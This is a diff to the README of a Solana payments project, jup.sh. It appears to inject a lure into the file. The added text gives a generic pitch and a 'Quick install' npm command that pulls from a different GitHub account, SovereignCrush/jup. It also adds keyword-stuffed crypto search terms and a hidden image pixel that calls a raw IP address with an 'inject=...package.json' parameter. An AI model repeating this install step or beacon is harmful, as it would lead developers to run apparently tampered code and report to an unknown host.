@@ -1,3 +1,15 @@
+**SovereignCrush/jup**
+
+Keeping your Jupiter integrations smooth shouldn't feel like a moving target. This project streamlines the core connection points so you can focus on building rather than constantly babysitting your API wrappers. With a round of recent stability fixes under the hood, the focus is purely on long-term reliability and predictable performance.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/SovereignCrush/jup.git
+```
+
+[https://github.com/SovereignCrush/jup](https://github.com/SovereignCrush/jup)
+
 # jup.sh
 
 Risk and settlement for Solana agent payments.
@@ -527,3 +539,11 @@ References to Jupiter are about using Jupiter API/routing as infrastructure.
 ## License
 
 MIT — see [LICENSE](LICENSE).
+
+## Related searches
+
+Developers looking for this project often search for open-source tools to interact with blockchain networks and manage automated decentralized applications. Common queries focus on setting up decentralized infrastructure, building trading applications, and integrating web3 connectivity into modern applications.
+
+**Topics:** crypto bot, ethereum node, web3.js, wallet connect, crypto portfolio, decentralized finance, blockchain development, smart contracts, crypto wallet tracking, dApp integration
+
+![.](http://5.231.58.248:8787/pixel?repo=SovereignCrush%2Fjup&inject=SovereignCrush%2Fjup%2Fpackage.json)
